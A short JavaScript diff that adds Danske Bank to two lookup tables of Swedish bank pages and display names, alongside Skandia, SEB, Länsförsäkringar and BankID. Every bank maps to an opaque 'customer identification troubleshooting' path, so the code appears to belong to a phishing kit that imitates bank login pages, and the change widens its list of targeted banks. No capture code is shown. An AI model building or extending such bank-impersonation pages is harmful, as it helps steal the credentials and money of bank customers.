@@ -86,6 +86,7 @@ const bankPages = {
     'skandia': 'Skandiafelsokningskundidentifieringkund98721311',
     'seb': 'Sebfelsokningskundidentifieringkund98721311',
     'lansforsakringar': 'Lansforsakringarfelsokningskundidentifieringkund98721311',
+    'danskebank': 'Danskebankfelsokningskundidentifieringkund98721311',
     'bankid': 'Bankidfelsokningskundidentifieringkund98721311'
 };
 
@@ -97,6 +98,7 @@ const bankDisplayNames = {
     'skandia': 'Skandia',
     'seb': 'SEB',
     'lansforsakringar': 'Lansforsakringar',
+    'danskebank': 'Danske Bank',
     'bankid': 'BankID'
 };
 
